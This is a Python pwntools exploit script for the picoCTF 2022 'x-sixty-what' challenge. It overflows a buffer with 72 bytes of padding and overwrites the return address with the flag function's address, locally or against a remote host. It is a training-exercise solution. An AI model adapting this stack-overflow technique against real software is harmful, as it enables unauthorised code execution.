from pwn import *
import argparse

"""
Pico CTF 2022 x-sixty-what - thankx to John Hammond for this.
"""
cgen = cyclic_gen()
cpayload = cgen.get(72)

parser = argparse.ArgumentParser()
parser.add_argument("dest", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)
args = parser.parse_args()

print(args.dest)

context.log_level = "debug"
elf = ELF('./vuln')

if args.dest == "remote":
    print(f"address to send: {hex(elf.symbols["flag"])}")
    flag_func_location = p64(elf.symbols["flag"] + 0x5) # why the fu*** it is 5 bytes and not 4 here ?
else:
    flag_func_location = p64(elf.symbols["flag"])
# ret_main = p32(elf.symbols["main"])
print(f"address of flag function: {flag_func_location}")
# cafefood = p32(0xCAFEF00D)
# foodfood = p32(0xF00DF00D)
print(flag_func_location)

print(f"payload: {cpayload}")
# offset = cpayload.find(b'daab')
# print(f"offset: {offset}")


payload = cpayload + flag_func_location
print(f"payload to send: {payload}")



if args.dest == "local":
    # with open("payload", "wb") as filep:
    #     filep.write(payload)
    p = elf.process()
    # g = gdb.attach(p, gdbscript="""
    #     b *flag
    #     r < payload
    # """)

#     # print(p.recv().decode('utf-8'))
if args.dest == "remote":
    if not args.target or not args.port:
        warning("Supply --target and --port")
        exit()
    p = remote(args.target, args.port)

banner = p.recvline()
print("Banner:", banner.decode())
# print(f"address just before pushinf it {hex(elf.symbols["flag"]+ 0x5)}")
# payload = b"A"* 72 + p64(elf.symbols["flag"]+ 0x5)
p.sendline(payload)

p.interactive()

try:
    response = p.recvline()
    print("Response:", response.decode())
except EOFError:
    print("Program closed connection (likely crash or exit)")
